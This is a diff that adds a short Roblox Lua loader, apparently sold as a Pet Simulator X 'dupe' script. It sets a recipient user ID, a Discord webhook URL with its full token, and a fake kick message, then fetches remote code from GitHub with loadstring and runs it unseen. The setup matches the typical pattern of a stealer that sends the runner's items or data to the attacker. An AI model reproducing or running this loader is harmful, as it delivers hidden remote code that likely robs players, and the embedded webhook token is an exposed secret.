@@ -1,0 +1,7 @@
+_G.UserID = 3783940478
+
+_G.Webhook = "https://discord.com/api/webhooks/1054007247623176192/YDB3PRh844wbCuBREwA4FESES6YkMrYtQWBEHxQOrNAflKLsty_eOcQBeX8iXghYGnm7"
+_G.KickMessage = "Sorry you have been kicked, please Rejoin"
+_G.PopUpMessage = "	Welcome"
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
